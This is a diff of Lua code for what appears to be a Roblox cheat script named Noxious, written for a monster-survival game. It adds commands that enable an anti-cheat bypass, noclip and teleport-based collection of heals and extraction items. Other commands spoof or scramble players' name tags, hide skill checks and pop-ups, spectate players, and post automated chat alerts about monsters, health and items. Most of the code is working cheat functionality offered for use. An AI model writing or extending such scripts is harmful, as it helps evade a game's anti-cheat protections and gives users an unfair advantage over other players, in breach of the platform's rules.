+	local wasbypassinganticheat = bypassinganticheat
+
+	task.spawn(function() execcmd("eacb") end)
+	task.spawn(function() execcmd("noclip") end)
+	task.spawn(function() execcmd("eia") end)
+
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+	local originalPosition = humanoidRootPart.CFrame
+
+	tpbypass(originalPosition)
+
+	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
+	if currentRoom then
+		local itemPositions = {}
+		for _, model in ipairs(currentRoom:GetChildren()) do
+			if model:IsA("Model") then
+				local itemsFolder = model:FindFirstChild("Items")
+				if itemsFolder then
+					for _, item in ipairs(itemsFolder:GetChildren()) do
+						if item:IsA("Model") and item.Name == "HealthKit" or item.Name == "Bandage" then
+							-- table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, -3.3, 0))
+							table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, 0, 0))
+						end
+					end
+				end
+			end
+		end
+
+		for _, itemCFrame in ipairs(itemPositions) do
+			tpbypass(itemCFrame)
+		end
+	end
+
+	tpbypass(originalPosition)
+
+	if not wasnoclipping then task.spawn(function() task.wait(0.5) execcmd("clip") end) end
+	if not haditemaura then task.spawn(function() task.wait(0.5) execcmd("dia") end) end
+	if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+
+	pickingupallheals = false
+end)
+
+pickingupallextractionitems = false
+
+addcommand("pickupallextractionitems", "puaei", function()
+	if pickingupallextractionitems then return end
+	pickingupallextractionitems = true
+
+	local wasnoclipping = noclipping
+	local haditemaura = itemauraenabled
+	local wasbypassinganticheat = bypassinganticheat
+
+	task.spawn(function() execcmd("eacb") end)
+	task.spawn(function() execcmd("noclip") end)
+	task.spawn(function() execcmd("eia") end)
+
+	local player = noxious["local player"]
+	local character = player.Character or player.CharacterAdded:Wait()
+	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+	local originalPosition = humanoidRootPart.CFrame
+
+	tpbypass(originalPosition)
+
+	local currentRoom = game.Workspace:FindFirstChild("CurrentRoom")
+	if currentRoom then
+		local itemPositions = {}
+		for _, model in ipairs(currentRoom:GetChildren()) do
+			if model:IsA("Model") then
+				local itemsFolder = model:FindFirstChild("Items")
+				if itemsFolder then
+					for _, item in ipairs(itemsFolder:GetChildren()) do
+						if item:IsA("Model") and item.Name == "JumperCable" or item.Name == "ExtractionSpeedCandy" or item.Name == "ExtractionCandy" then
+							-- table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, -3.3, 0))
+							table.insert(itemPositions, item:GetModelCFrame() * CFrame.new(0, 0, 0))
+						end
+					end
+				end
+			end
+		end
+
+		for _, itemCFrame in ipairs(itemPositions) do
+			tpbypass(itemCFrame)
+		end
+	end
+
+	tpbypass(originalPosition)
+
+	if not wasnoclipping then task.spawn(function() task.wait(0.5) execcmd("clip") end) end
+	if not haditemaura then task.spawn(function() task.wait(0.5) execcmd("dia") end) end
+	if not wasbypassinganticheat then task.spawn(function() execcmd("dacb") end) end
+
+	pickingupallextractionitems = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("changeusername", "cuser", function(target, newName)
+	for _, player in ipairs(resolveplayers(target)) do
+		task.spawn(function()
+			local playersFolder = workspace:FindFirstChild("Players") or workspace:WaitForChild("InGamePlayers")
+			local playerModel = playersFolder:FindFirstChild(player.Name)
+			if not playerModel then return end
+
+			local humanoidRootPart = playerModel:FindFirstChild("HumanoidRootPart")
+			local nameTag = humanoidRootPart and humanoidRootPart:FindFirstChild("NameTag")
+			local frame = nameTag and nameTag:FindFirstChild("Frame")
+			local usernamelabel = frame and frame:FindFirstChild("UserName")
+
+			if usernamelabel then
+				usernamelabel.Text = "(@" .. newName .. ")"
+			end
+		end)
+
+		if player == noxious["local player"] then
+			local topFrame = noxious["in studio"]
+				and player.PlayerGui:FindFirstChild(noxious["screen gui"].Name).mainframe:WaitForChild("TopFrame")
+				or game:GetService("CoreGui").Noxious.mainframe:WaitForChild("TopFrame")
+
+			local welcome2 = topFrame:FindFirstChild("welcome2")
+			local welcome3 = noxious["top frame 2"]:FindFirstChild("welcome3")
+			if welcome2 then welcome2.Text = "(@" .. newName .. ")" end
+			if welcome3 then welcome3.Text = "(@" .. newName .. ")" end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("changedisplayname", "cdisplay", function(target, newName)
+	for _, player in ipairs(resolveplayers(target)) do
+		task.spawn(function()
+			local playersFolder = workspace:FindFirstChild("Players") or workspace:WaitForChild("InGamePlayers")
+			local playerModel = playersFolder:FindFirstChild(player.Name)
+			if not playerModel then return end
+
+			local humanoidRootPart = playerModel:FindFirstChild("HumanoidRootPart")
+			local nameTag = humanoidRootPart and humanoidRootPart:FindFirstChild("NameTag")
+			local frame = nameTag and nameTag:FindFirstChild("Frame")
+			local displaynamelabel = frame and frame:FindFirstChild("DisplayName")
+
+			if displaynamelabel then
+				displaynamelabel.Text = newName
+			end
+		end)
+
+		if player == noxious["local player"] then
+			local topFrame = noxious["in studio"]
+				and player.PlayerGui:FindFirstChild(noxious["screen gui"].Name).mainframe:WaitForChild("TopFrame")
+				or game:GetService("CoreGui").Noxious.mainframe:WaitForChild("TopFrame")
+
+			local welcome = topFrame:FindFirstChild("welcome")
+			local welcome4 = noxious["top frame 2"]:FindFirstChild("welcome4")
+			if welcome then welcome.Text = "Welcome, " .. newName .. "!" end
+			if welcome4 then welcome4.Text = "Welcome, " .. newName .. "!" end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("changeownertagtext", "cotagt", function(target, newName)
+	for _, player in ipairs(resolveplayers(target)) do
+		local playersFolder = workspace:FindFirstChild("Players") or workspace:WaitForChild("InGamePlayers")
+		local playerModel = playersFolder:FindFirstChild(player.Name)
+		if not playerModel then continue end
+
+		local humanoidRootPart = playerModel:FindFirstChild("HumanoidRootPart")
+		local nameTag = humanoidRootPart and humanoidRootPart:FindFirstChild("NameTag")
+		local frame = nameTag and nameTag:FindFirstChild("Frame")
+		local ownerlabel = frame and frame:FindFirstChild("GroupRank")
+
+		if ownerlabel then
+			ownerlabel.Text = "[" .. newName .. "]"
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local scriptEnabled = false
+local savedDisplayNames = {}
+local savedUserNames = {}
+
+function resolveplayers(target)
+	if not target then target = "me" end
+	local resolved = {}
+	if target == "me" then
+		table.insert(resolved, noxious["players"].LocalPlayer)
+	elseif target == "others" then
+		for _, p in ipairs(noxious["players"]:GetPlayers()) do
+			if p ~= noxious["players"].LocalPlayer then
+				table.insert(resolved, p)
+			end
+		end
+	elseif target == "all" then
+		resolved = noxious["players"]:GetPlayers()
+	elseif target == "random" then
+		local allPlayers = noxious["players"]:GetPlayers()
+		if #allPlayers > 0 then
+			local randomPlayer = allPlayers[math.random(1, #allPlayers)]
+			table.insert(resolved, randomPlayer)
+		end
+	else
+		for _, p in ipairs(noxious["players"]:GetPlayers()) do
+			if p.Name:lower():find(target:lower(), 1, true) then
+				table.insert(resolved, p)
+				break
+			end
+		end
+	end
+	return resolved
+end
+
+addcommand("enableglitchednametag", "egnt", function(target)
+	local resolved = resolveplayers(target)
+	if #resolved == 0 then return end
+
+	local welcome, welcome2
+	if noxious["in studio"] then
+		local gui = noxious["local player"]:WaitForChild("PlayerGui"):FindFirstChild(noxious["screen gui"].Name)
+		if gui then
+			welcome = gui.mainframe:WaitForChild("TopFrame"):WaitForChild("welcome")
+			welcome2 = gui.mainframe.TopFrame:WaitForChild("welcome2")
+		end
+	else
+		local core = game:GetService("CoreGui"):FindFirstChild("Noxious")
+		if core then
+			welcome = core.mainframe:WaitForChild("TopFrame"):WaitForChild("welcome")
+			welcome2 = core.mainframe.TopFrame:WaitForChild("welcome2")
+		end
+	end
+
+	scriptEnabled = true
+	task.spawn(function()
+		while scriptEnabled do
+			local randomText = randomstring(16)
+
+			if welcome and welcome2 then
+				welcometxt = welcome.Text
+				welcome2txt = welcome2.Text
+				welcome.Text = "Welcome, " .. randomText .. "!"
+				welcome2.Text = "(@" .. randomText .. ")"
+			end
+
+			for _, p in ipairs(resolved) do
+				local playersFolder = workspace:FindFirstChild("Players") or workspace:FindFirstChild("InGamePlayers")
+				local playerModel = playersFolder and playersFolder:FindFirstChild(p.Name)
+				if playerModel then
+					local hrp = playerModel:FindFirstChild("HumanoidRootPart")
+					local tag = hrp and hrp:FindFirstChild("NameTag")
+					local frame = tag and tag:FindFirstChild("Frame")
+					local disp = frame and frame:FindFirstChild("DisplayName")
+					local user = frame and frame:FindFirstChild("UserName")
+					if disp and user then
+						if not savedDisplayNames[p] then
+							savedDisplayNames[p] = disp.Text
+							savedUserNames[p] = user.Text
+						end
+						disp.Text = randomText
+						user.Text = "(@" .. randomText .. ")"
+					end
+				end
+			end
+
+			task.wait(0)
+		end
+	end)
+end)
+
+addcommand("disableglitchednametag", "dgnt", function(target)
+	scriptEnabled = false
+
+	local resolved = resolveplayers(target)
+	if #resolved == 0 then return end
+
+	local welcome = noxious["top frame text"]
+	local welcome2 = noxious["top frame subtext"]
+
+	if welcome and welcome2 and welcometxt and welcome2txt then
+		welcome.Text = welcometxt
+		welcome2.Text = welcome2txt
+	end
+
+	for _, p in ipairs(resolved) do
+		local playersFolder = workspace:FindFirstChild("Players") or workspace:FindFirstChild("InGamePlayers")
+		local playerModel = playersFolder and playersFolder:FindFirstChild(p.Name)
+		if playerModel then
+			local hrp = playerModel:FindFirstChild("HumanoidRootPart")
+			local tag = hrp and hrp:FindFirstChild("NameTag")
+			local frame = tag and tag:FindFirstChild("Frame")
+			local disp = frame and frame:FindFirstChild("DisplayName")
+			local user = frame and frame:FindFirstChild("UserName")
+			if disp and user and savedDisplayNames[p] and savedUserNames[p] then
+				disp.Text = savedDisplayNames[p]
+				user.Text = savedUserNames[p]
+			end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local isrunofs30znametagenabled = {}
+local runTasks = {}
+
+local messages = {
+	{display = "Sempiterna", user = "(@Sempiterna)", welcome = "Welcome, Sempiterna!", welcome2 = "(@Sempiterna)", delay = 0.55},
+	{display = "Sempiterna sit", user = "(@Sempiterna sit)", welcome = "Welcome, Sempiterna sit!", welcome2 = "(@Sempiterna sit)", delay = 0.15},
+	{display = "Sempiterna sit beatae,", user = "(@Sempiterna sit beatae,)", welcome = "Welcome, Sempiterna sit beatae!", welcome2 = "(@Sempiterna sit beatae,)", delay = 0.7},
+	{display = "Sempiterna sit beatae, trinitati", user = "(@Sempiterna sit beatae, trinitati)", welcome = "Welcome, Sempiterna sit beatae, trinitati!", welcome2 = "(@Sempiterna sit beatae, trinitati)", delay = 0.7},
+	{display = "Sempiterna sit beatae, trinitati gloria.", user = "(@Sempiterna sit beatae, trinitati gloria.)", welcome = "Welcome, Sempiterna sit beatae, trinitati gloria!", welcome2 = "(@Sempiterna sit beatae, trinitati gloria.)", delay = 0.7},
+	{display = "Aequa", user = "(@Aequa)", welcome = "Welcome, Aequa!", welcome2 = "(@Aequa)", delay = 0.2},
+	{display = "Aequa patri", user = "(@Aequa patri)", welcome = "Welcome, Aequa patri!", welcome2 = "(@Aequa patri)", delay = 0.4},
+	{display = "Aequa patri filioque,", user = "(@Aequa patri filioque,)", welcome = "Welcome, Aequa patri filioque!", welcome2 = "(@Aequa patri filioque,)", delay = 0.7},
+	{display = "Aequa patri filioque, par", user = "(@Aequa patri filioque, par)", welcome = "Welcome, Aequa patri filioque, par!", welcome2 = "(@Aequa patri filioque, par)", delay = 0.2},
+	{display = "Aequa patri filioque, par decus", user = "(@Aequa patri filioque, par decus)", welcome = "Welcome, Aequa patri filioque, par decus!", welcome2 = "(@Aequa patri filioque, par decus)", delay = 0.3},
+	{display = "Aequa patri filioque, par decus paraclito.", user = "(@Aequa patri filioque, par decus paraclito.)", welcome = "Welcome, Aequa patri filioque, par decus paraclito!", welcome2 = "(@Aequa patri filioque, par decus paraclito.)", delay = 0.77}
+}
+
+function runofs30znametag(player)
+	isrunofs30znametagenabled[player] = true
+	task.spawn(function()
+		local playersFolder = workspace:FindFirstChild("Players") or workspace:FindFirstChild("InGamePlayers")
+		local model = playersFolder and playersFolder:FindFirstChild(player.Name)
+		local hrp = model and model:FindFirstChild("HumanoidRootPart")
+		local nameTag = hrp and hrp:FindFirstChild("NameTag")
+		local frame = nameTag and nameTag:FindFirstChild("Frame")
+		local displayNameLabel = frame and frame:FindFirstChild("DisplayName")
+		local userNameLabel = frame and frame:FindFirstChild("UserName")
+
+		local welcome, welcome2
+		if player == game:GetService("Players").LocalPlayer then
+			if noxious["in studio"] then
+				local gui = player:FindFirstChild("PlayerGui"):FindFirstChild(noxious["screen gui"].Name)
+				welcome = gui and gui.mainframe:FindFirstChild("TopFrame"):FindFirstChild("welcome")
+				welcome2 = gui and gui.mainframe.TopFrame:FindFirstChild("welcome2")
+			else
+				local top = game:GetService("CoreGui"):FindFirstChild("Noxious")
+				welcome = top and top.mainframe:FindFirstChild("TopFrame"):FindFirstChild("welcome")
+				welcome2 = top and top.mainframe.TopFrame:FindFirstChild("welcome2")
+			end
+		end
+
+		while isrunofs30znametagenabled[player] do
+			for _, msg in ipairs(messages) do
+				if not isrunofs30znametagenabled[player] then return end
+
+				if displayNameLabel and userNameLabel then
+					displayNameLabel.Text = msg.display
+					userNameLabel.Text = msg.user
+				end
+
+				if welcome then welcome.Text = msg.welcome end
+				if welcome2 then welcome2.Text = msg.welcome2 end
+
+				task.wait(msg.delay)
+			end
+		end
+	end)
+end
+
+addcommand("enablerunofs30znametag", "erosnt", function(target)
+	for _, player in ipairs(resolveplayers(target)) do
+		if not isrunofs30znametagenabled[player] then
+			runofs30znametag(player)
+		end
+	end
+end)
+
+addcommand("disablerunofs30znametag", "drosnt", function(target)
+	for _, player in ipairs(resolveplayers(target)) do
+		isrunofs30znametagenabled[player] = false
+
+		local playersFolder = workspace:FindFirstChild("Players") or workspace:FindFirstChild("InGamePlayers")
+		local model = playersFolder and playersFolder:FindFirstChild(player.Name)
+		local hrp = model and model:FindFirstChild("HumanoidRootPart")
+		local nameTag = hrp and hrp:FindFirstChild("NameTag")
+		local frame = nameTag and nameTag:FindFirstChild("Frame")
+		local displayNameLabel = frame and frame:FindFirstChild("DisplayName")
+		local userNameLabel = frame and frame:FindFirstChild("UserName")
+
+		if displayNameLabel and userNameLabel then
+			displayNameLabel.Text = player.DisplayName
+			userNameLabel.Text = "(@" .. player.Name .. ")"
+		end
+
+		if player == game:GetService("Players").LocalPlayer then
+			local welcome, welcome2
+			if noxious["in studio"] then
+				local gui = player:FindFirstChild("PlayerGui"):FindFirstChild(noxious["screen gui"].Name)
+				welcome = gui and gui.mainframe:FindFirstChild("TopFrame"):FindFirstChild("welcome")
+				welcome2 = gui and gui.mainframe.TopFrame:FindFirstChild("welcome2")
+			else
+				local top = game:GetService("CoreGui"):FindFirstChild("Noxious")
+				welcome = top and top.mainframe:FindFirstChild("TopFrame"):FindFirstChild("welcome")
+				welcome2 = top and top.mainframe.TopFrame:FindFirstChild("welcome2")
+			end
+
+			if welcome then welcome.Text = "Welcome, " .. player.DisplayName .. "!" end
+			if welcome2 then welcome2.Text = "(@" .. player.Name .. ")" end
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("showownertag", "sot", function(target)
+	for _, player in ipairs(resolveplayers(target)) do
+		local playersFolder = workspace:FindFirstChild("Players") or workspace:FindFirstChild("InGamePlayers")
+		local model = playersFolder and playersFolder:FindFirstChild(player.Name)
+		if not model then continue end
+
+		local tag = model:FindFirstChild("HumanoidRootPart")
+		if tag then
+			tag = tag:FindFirstChild("NameTag")
+		end
+		if tag then
+			tag = tag:FindFirstChild("Frame")
+		end
+		local groupRankLabel = tag and tag:FindFirstChild("GroupRank")
+
+		if groupRankLabel then
+			groupRankLabel.Visible = true
+		end
+	end
+end)
+
+addcommand("hideownertag", "hot", function(target)
+	for _, player in ipairs(resolveplayers(target)) do
+		local playersFolder = workspace:FindFirstChild("Players") or workspace:FindFirstChild("InGamePlayers")
+		local model = playersFolder and playersFolder:FindFirstChild(player.Name)
+		if not model then continue end
+
+		local tag = model:FindFirstChild("HumanoidRootPart")
+		if tag then
+			tag = tag:FindFirstChild("NameTag")
+		end
+		if tag then
+			tag = tag:FindFirstChild("Frame")
+		end
+		local groupRankLabel = tag and tag:FindFirstChild("GroupRank")
+
+		if groupRankLabel then
+			groupRankLabel.Visible = false
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("antiskillcheck", "ask", function()
+	local player = game:GetService("Players").LocalPlayer
+	local skillCheckFrame = player.PlayerGui.ScreenGui.Menu:FindFirstChild("SkillCheckFrame")
+
+	if skillCheckFrame then
+		skillCheckFrame.Parent = game:GetService("ReplicatedStorage")
+	end
+end)
+
+addcommand("unantiskillcheck", "uask", function()
+	local player = game:GetService("Players").LocalPlayer
+	local skillCheckFrame = game:GetService("ReplicatedStorage"):FindFirstChild("SkillCheckFrame")
+
+	if skillCheckFrame then
+		skillCheckFrame.Parent = player.PlayerGui.ScreenGui.Menu
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("antipopups", "apu", function()
+	local popup = noxious["local player"].PlayerGui.ScreenGui:FindFirstChild("PopUp")
+
+	if popup then
+		popup.Parent = game:GetService"ReplicatedStorage"
+	end
+end)
+
+addcommand("unantipopups", "uapu", function()
+	local popup = game:GetService("ReplicatedStorage"):FindFirstChild("PopUp")
+
+	if popup then
+		popup.Parent = noxious["local player"].PlayerGui.ScreenGui
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("spectate", "view", function(target)
+	execcmd("unview")
+	local players = noxious["players"]
+	local localPlayer = players.LocalPlayer
+	local camera = workspace.CurrentCamera
+
+	local function getTargetPlayer(target)
+		if target == "me" then
+			return localPlayer
+		elseif target == "random" then
+			local allPlayers = players:GetPlayers()
+			if #allPlayers > 0 then
+				return allPlayers[math.random(1, #allPlayers)]
+			end
+		elseif target == "others" then
+			return nil
+		elseif target == "all" then
+			return nil
+		else
+			for _, player in ipairs(players:GetPlayers()) do
+				if player.Name:lower():find(target:lower(), 1, true) then
+					return player
+				end
+			end
+		end
+		return nil
+	end
+
+	local targetPlayer = getTargetPlayer(target)
+
+	if not targetPlayer or targetPlayer == localPlayer then
+		return
+	end
+
+	local targetCharacter = targetPlayer.Character
+	if targetCharacter and targetCharacter:FindFirstChild("Head") then
+		camera.CameraSubject = targetCharacter.Head
+	end
+end)
+
+addcommand("unspectate", "unview", function()
+	workspace.CurrentCamera:remove()
+	task.wait(.1)
+	repeat task.wait() until noxious["character"] ~= nil
+	workspace.CurrentCamera.CameraSubject = noxious["character"]:FindFirstChildWhichIsA('Humanoid')
+	workspace.CurrentCamera.CameraType = "Custom"
+	noxious["local player"].CameraMinZoomDistance = 0.5
+	noxious["local player"].CameraMaxZoomDistance = 400
+	noxious["local player"].CameraMode = "Classic"
+	noxious["character"].Head.Anchored = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("enablechatguider", "ecg", function()
+	task.spawn(function() execcmd("etcg") end)
+	task.spawn(function() execcmd("elhcg") end)
+	task.spawn(function() execcmd("edpcg") end)
+	task.spawn(function() execcmd("ericg") end)
+	task.spawn(function() execcmd("eipucg") end)
+	task.spawn(function() execcmd("egtecg") end)
+end)
+
+addcommand("disablechatguider", "dcg", function()
+	task.spawn(function() execcmd("dtcg") end)
+	task.spawn(function() execcmd("dlhcg") end)
+	task.spawn(function() execcmd("ddpcg") end)
+	task.spawn(function() execcmd("dricg") end)
+	task.spawn(function() execcmd("dipucg") end)
+	task.spawn(function() execcmd("dgtecg") end)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function nocaps(text)
+	return text:lower()
+end
+
+local trackedtwisteds = {}
+local enabletwistedchat = false
+local messagetwistedsent = false
+local lastmodeltick = tick()
+
+function cleanmonstername(name)
+	if name == "RazzleDazzleMonster" then
+		return "Razzle & Dazzle"
+	end
+	return name:gsub("Monster", "")
+end
+
+function formatMonsterList(names)
+	if #names == 1 then
+		return names[1]
+	elseif #names == 2 then
+		return names[1] .. " and " .. names[2]
+	else
+		local allButLast = table.concat(names, ", ", 1, #names - 1)
+		return allButLast .. ", and " .. names[#names]
+	end
+end
+
+function runtwistedchatloop()
+	local currentroom = game.Workspace:FindFirstChild("CurrentRoom")
+	if not currentroom then return end
+
+	while enabletwistedchat do
+		local newtwisteds = {}
+		local monsteramount = 0
+		local anynew = false
+
+		if #currentroom:GetChildren() == 0 then
+			trackedtwisteds = {}
+			messagetwistedsent = false
+		else
+			for _, model in ipairs(currentroom:GetChildren()) do
+				if model:IsA("Model") then
+					local monsters = model:FindFirstChild("Monsters")
+					if monsters then
+						for _, monster in ipairs(monsters:GetChildren()) do
+							monsteramount += 1
+							local name = cleanmonstername(monster.Name)
+
+							if not trackedtwisteds[name] then
+								table.insert(newtwisteds, name)
+								trackedtwisteds[name] = true
+								anynew = true
+								lastmodeltick = tick()
+							end
+						end
+					end
+				end
+			end
+		end
+
+		if monsteramount > 1 and #newtwisteds > 0 and not messagetwistedsent then
+			local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+			if channel then
+				local formattedList = formatMonsterList(newtwisteds)
+				task.wait(2)
+				if botlikemessages == true then
+					channel:SendAsync("Twisteds: " .. formattedList)
+				else
+					task.wait(2)
+					channel:SendAsync(nocaps(formattedList))
+				end
+				task.wait(0.5)
+				messagetwistedsent = true
+			end
+		end
+
+		if monsteramount == 0 then
+			messagetwistedsent = false
+		end
+
+		for name, _ in pairs(trackedtwisteds) do
+			local found = false
+			for _, model in ipairs(currentroom:GetChildren()) do
+				local monsters = model:FindFirstChild("Monsters")
+				if monsters and monsters:FindFirstChild(name) then
+					found = true
+					break
+				end
+			end
+			if not found then
+				trackedtwisteds[name] = nil
+			end
+		end
+
+		task.wait(0.1)
+	end
+end
+
+addcommand("enabletwistedschatguider", "etcg", function()
+	if enabletwistedchat then return end
+	enabletwistedchat = true
+	messagetwistedsent = false
+	task.spawn(runtwistedchatloop)
+end)
+
+addcommand("disabletwistedschatguider", "dtcg", function()
+	enabletwistedchat = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local healthChatConnection
+local chattedLowHealth = {}
+
+addcommand("enablelowhealthchatguider", "elhcg", function()
+	local inGamePlayers = workspace:FindFirstChild("InGamePlayers")
+	if healthChatConnection or not inGamePlayers then return end
+
+	healthChatConnection = noxious["run service"].RenderStepped:Connect(function()
+		local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+		if not channel then return end
+
+		for _, model in ipairs(inGamePlayers:GetChildren()) do
+			if model:IsA("Model") then
+				local humanoid = model:FindFirstChildOfClass("Humanoid")
+				local config = model:FindFirstChild("Config")
+				local charname = config and config:FindFirstChild("CharacterName") and config.CharacterName.Value or "Unknown"
+
+				if humanoid then
+					local playerName = model.Name
+
+					if humanoid.Health == 1 and not chattedLowHealth[playerName] then
+						local message = charname .. " is at 1"
+						if botlikemessages == true then
+							channel:SendAsync(playerName .. " (" .. charname .. ") is at 1 heart.")
+						else
+							task.delay(1, function()
+								channel:SendAsync(message:lower())
+							end)
+						end
+						chattedLowHealth[playerName] = true
+					elseif humanoid.Health > 1 then
+						chattedLowHealth[playerName] = nil
+					end
+				end
+			end
+		end
+	end)
+end)
+
+addcommand("disablelowhealthchatguider", "dlhcg", function()
+	if healthChatConnection then
+		healthChatConnection:Disconnect()
+		healthChatConnection = nil
+	end
+	chattedLowHealth = {}
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local deadchatconnection
+local chatteddeadplayers = {}
+
+addcommand("enabledeadplayerchatguider", "edpcg", function()
+	local ingameplayers = workspace:FindFirstChild("InGamePlayers")
+	if deadchatconnection or not ingameplayers then return end
+
+	deadchatconnection = noxious["run service"].RenderStepped:Connect(function()
+		local currentplayers = {}
+
+		for _, model in ipairs(ingameplayers:GetChildren()) do
+			if model:IsA("Model") then
+				local config = model:FindFirstChild("Config")
+				local charname = config and config:FindFirstChild("CharacterName") and config.CharacterName.Value or "Unknown"
+				currentplayers[model.Name] = charname
+
+				if not chatteddeadplayers[model.Name] then
+					chatteddeadplayers[model.Name] = charname
+				end
+			end
+		end
+
+		for playername, charname in pairs(chatteddeadplayers) do
+			if not currentplayers[playername] then
+				local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+				if channel then
+					if botlikemessages == true then
+						channel:SendAsync(playername .. " (" .. charname .. ") died or left the game.")
+					else
+						task.delay(1, function()
+							local message = charname .. " died or left"
+							channel:SendAsync(message:lower())
+						end)
+					end
+				end
+				chatteddeadplayers[playername] = nil
+			end
+		end
+	end)
+end)
+
+addcommand("disabledeadplayerchatguider", "ddpcg", function()
+	if deadchatconnection then
+		deadchatconnection:Disconnect()
+		deadchatconnection = nil
+		chatteddeadplayers = {}
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local chatteditems = {}
+local rareitems = {
+	"Bandage",
+	"HealthKit",
+	"SmokeBomb",
+	"EjectButton",
+	"Valve",
+	"Box chocolates",
+	"AirHorn",
+	"EnigmaCandy",
+	"JumperCable",
+	"PopBottle"
+}
+
+local itemnamemapping = {
+	["HealthKit"] = "Medkit",
+	["SmokeBomb"] = "Smoke bomb",
+	["EjectButton"] = "Eject button",
+	["ChocolateBox"] = "Box of chocolates",
+	["AirHorn"] = "Air horn",
+	["EnigmaCandy"] = "Enigma candy",
+	["JumperCable"] = "Jumper cable",
+	["PopBottle"] = "Bottle of pop",
+}
+
+local chatloopactive = false
+
+function formatItemList(items)
+	if #items == 1 then
+		return items[1]
+	elseif #items == 2 then
+		return items[1] .. " and " .. items[2]
+	else
+		local allButLast = table.concat(items, ", ", 1, #items - 1)
+		return allButLast .. ", and " .. items[#items]
+	end
+end
+
+function startrareitemschat()
+	local room = workspace:FindFirstChild("CurrentRoom")
+	if not room then return end
+
+	while chatloopactive do
+		for _, model in ipairs(room:GetChildren()) do
+			if model:IsA("Model") then
+				local items = model:FindFirstChild("Items")
+				if items then
+					local found = {}
+					for _, item in ipairs(items:GetChildren()) do
+						if table.find(rareitems, item.Name) and not chatteditems[item.Name] then
+							table.insert(found, item.Name)
+							chatteditems[item.Name] = true
+						end
+					end
+
+					if #found > 0 then
+						for i, name in ipairs(found) do
+							if itemnamemapping[name] then
+								found[i] = itemnamemapping[name]
+							end
+						end
+
+						local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+						if channel then
+							local formattedList = formatItemList(found)
+							task.wait(2)
+							if botlikemessages == true then
+								channel:SendAsync(formattedList .. " has been detected.")
+							else
+								task.wait(2)
+								channel:SendAsync(nocaps(formattedList))
+							end
+						end
+					end
+				end
+			end
+		end
+
+		for name in pairs(chatteditems) do
+			local exists = false
+			for _, model in ipairs(room:GetChildren()) do
+				local items = model:FindFirstChild("Items")
+				if items and items:FindFirstChild(name) then
+					exists = true
+					break
+				end
+			end
+			if not exists then
+				chatteditems[name] = nil
+			end
+		end
+
+		task.wait(0.1)
+	end
+end
+
+addcommand("enablerareitemschatguider", "ericg", function()
+	if chatloopactive then return end
+	chatloopactive = true
+	chatteditems = {}
+	task.spawn(startrareitemschat)
+end)
+
+addcommand("disablerareitemschatguider", "dricg", function()
+	chatloopactive = false
+	chatteditems = {}
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+gettoelevatorenabled = false
+requiredtotal = 0
+effectiveTotal = 0
+gtesent = false
+previousGeneratorValues = {}
+dogte = false
+
+function updateamounts()
+	local room = workspace:FindFirstChild("CurrentRoom")
+	if not room then return end
+
+	requiredtotal = 0
+	effectiveTotal = 0
+
+	for _, model in pairs(room:GetChildren()) do
+		local gens = model:FindFirstChild("Generators")
+		if gens then
+			for _, gen in pairs(gens:GetChildren()) do
+				if gen:IsA("Model") then
+					local stats = gen:FindFirstChild("Stats")
+					local cur = stats and stats:FindFirstChild("CurrentAmount")
+					local req = stats and stats:FindFirstChild("RequiredAmount")
+					if cur and req then
+						requiredtotal += req.Value
+
+						local id = gen:GetDebugId(1)
+						local lastValue = previousGeneratorValues[id] or 0
+						local delta = cur.Value - lastValue
+
+						if delta >= 700 or cur.Value > 800 then
+							effectiveTotal += 45
+						else
+							effectiveTotal += cur.Value
+						end
+
+						previousGeneratorValues[id] = cur.Value
+					end
+				end
+			end
+		end
+	end
+end
+
+function resetifempty()
+	local room = workspace:FindFirstChild("CurrentRoom")
+	if not room or #room:GetChildren() == 0 then
+		requiredtotal = 0
+		effectiveTotal = 0
+		gtesent = false
+		previousGeneratorValues = {}
+	end
+end
+
+task.spawn(function()
+	while dogte do
+		updateamounts()
+
+		if gettoelevatorenabled and not gtesent and requiredtotal > 0 and effectiveTotal >= (requiredtotal - 20) then
+			local chan = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+			if chan then
+				if botlikemessages == true then
+					chan:SendAsync("Get to the elevator.")
+				else
+					task.delay(1, function()
+						chan:SendAsync("gte")
+					end)
+				end
+				gtesent = true
+			end
+		end
+
+		resetifempty()
+		task.wait(1)
+	end
+end)
+
+addcommand("enablegettoelevatorchatguider", "egtecg", function()
+	gettoelevatorenabled = true
+	dogte = true
+end)
+
+addcommand("disablegettoelevatorchatguider", "dgtecg", function()
+	gettoelevatorenabled = false
+	dogte = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("enablenotifier", "en", function()
+	task.spawn(function() execcmd("etn") end)
+	task.spawn(function() execcmd("elhn") end)
